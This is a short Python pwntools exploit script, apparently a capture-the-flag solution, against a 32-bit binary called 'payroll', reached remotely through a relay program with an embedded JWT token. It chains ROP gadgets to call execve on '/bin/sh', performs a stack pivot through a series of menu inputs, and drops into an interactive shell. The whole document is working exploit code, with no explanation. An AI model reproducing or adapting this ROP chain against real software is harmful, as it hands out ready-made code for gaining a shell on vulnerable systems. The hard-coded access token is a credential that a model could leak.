from pwn import *

PROGNAME   = "payroll"

if args.REMOTE:
    p = process(["./cli-relay", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFiQGdlZWdsZS5vcmciLCJzZXJ2aWNlIjoidWJlcnByb3h5QHNlcnZpY2VzLmdlZWdsZS5vcmciLCJleHAiOjE1NzQ1ODE3NjR9.Q4IVZ28t9s73-E7Lwr42GsbpXi4bqJF9MpVTkKJrllU", "payroll.corp.geegle.org"])
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf

gadget = lambda x : p32(elf.search(asm(x, arch=elf.arch)).next())


popeax = gadget("pop eax; add al, 8; add ecx, ecx; ret")
popebx = gadget("pop ebx; ret;");
xorecxedx = gadget("xor ecx, ecx; xor edx, edx; ret")

payload = cyclic(12)
payload += popeax + p32(constants.SYS_execve - 8)
payload += xorecxedx
payload += popebx + p32(elf.search("/bin/sh").next())
payload += gadget("int 0x80")

p.sendlineafter(":", payload)

for i in range(0x41, 0x48):
    p.sendlineafter("): ", "a")
    p.sendlineafter(": ", chr(i)*4)
    p.sendlineafter(": ", chr(i + 1)*4)

stack_pivot = gadget("add esp, 8; pop ebx; ret")

p.sendlineafter("): ", "a")
p.sendlineafter(": ", 'AAAA')
pause()
p.sendlineafter(": ", stack_pivot)


pause()
p.sendlineafter(":", "q")

p.interactive()

